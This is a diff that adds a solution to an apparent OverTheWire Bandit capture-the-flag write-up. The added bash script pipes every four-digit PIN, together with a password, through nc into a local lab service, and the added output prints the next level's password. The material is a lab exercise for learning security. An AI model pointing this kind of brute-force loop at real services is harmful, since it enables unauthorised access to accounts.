@@ -1218,7 +1218,27 @@ You do not need to create new connections each time.
 **Solution:**
 
 ```bash
+bandit24@bandit:/$ cd /tmp/brute/ 
+bandit24@bandit:/tmp/brute/ nano brute25.sh
+
+#!/bin/bash
+PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
+for i in {0000..9999}; do
+    echo "$PASS $i"
+done | nc localhost 30002 > output.txt 2>&1
+echo "Done! Checking result..."
+grep -E "bandit25|password" output.txt
+
+bandit24@bandit:/tmp/brute/ chmod +x brute25.sh
+bandit24@bandit:/tmp/brute/ ./brute25.sh
+
+Wrong! Please enter the correct current password and pincode. Try again.
+.
+.
+.
+Wrong! Please enter the correct current password and pincode. Try again.
+The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
 ```
 
----
+
 
